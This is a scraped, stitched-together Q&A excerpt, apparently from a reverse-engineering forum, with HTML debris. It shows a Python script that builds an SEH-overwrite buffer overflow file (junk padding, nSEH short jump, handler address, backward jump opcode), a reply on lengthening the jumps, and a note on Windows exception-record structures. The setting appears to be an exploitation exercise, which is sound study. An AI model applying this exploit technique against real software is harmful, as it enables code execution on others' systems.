What I did was to create a file which gets read from the program. Here is the code I am using for this:\n </p>\n <pre><code>#!/usr/bin/env python\n\nimport struct\n\nmystring = b\"\\xCC\"*1096# junk\nnSEH = b\"\\xeb\\x06\\x90\\x90\"\nSEH  = struct.pack(\"<L\", 0x004011B6)\nopcode = \"\\xe9\\xdf\\xf6\\xff\\xff\"\n\nmystring += nSEH + SEH + (\"\\x90\"*16) + opcode\nfileName='C:\\hellothere.bin'\n\nwith open(fileName, 'wb') as fb:\n    fb.write(bytearray(mystring))\nfb.close()\n</code></pre>\n <p>\n  So, I am stuck at this point where I am overriding the buffer with\n  <code>\n   \\xCC\n  </code>\n  , But my question is, when I am placing another jump code where the\n  <code>\n   CC\n  </code>\n  's override the saved\n  <code>\n   EIP\n  </code>\n  register. Can I jump further backwards to where my shell code takes place ?\n </p>\n <p>\n  I mean in principle this should be possible for some tweaking or adjusting  of the exploit code itself.\n </p>\n <p>\n  Any idea ?\n </p>\n <p>\n  <img alt=\"exercise\" src=\"https://i.sstatic.net/SWEJR.png\"/>\n </p>\n</div>\n</body></html>",

If you want to jump further you can change nSEH to \\xeb\\xff, change your opcode to a bigger jump back. You could also put a second jump in your shellcode but I don't know why you would do that.\n</span>\n</body></html>",

Where\n  <strong>\n   *Next\n  </strong>\n  is the pointer to the\n  <strong>\n   Previous EXCEPTION_REGISTRATION_RECORD\n  </strong>\n  and\n  <strong>\n   Handler\n  </strong>\n  is the function pointer to the\n  <strong>\n   Exception handler\n  </strong>\n  .\n </p>\n <p>\n  The\n  <strong>\n   FS:0\n  </strong>\n  register always points to the first\n  <strong>\n   EXCEPTION_REGISTRATION_RECORD\n  </strong>\n  . Once the\n  <strong>\n   EXCEPTION_REGISTRATION_RECORD\n  </strong>\n  is pushed on the stack, the\n  <strong>\n   FS:0\n  </strong>\n  register will be set to point to the new\n  <strong>\n   EXCEPTION_REGISTRATION_RECORD\n  </strong>\n  and\n  <strong>\n   Next\n  </strong>\n  record will be set to point to the previous value of\n  <strong>\n   FS:0\n  </strong>\n  register.
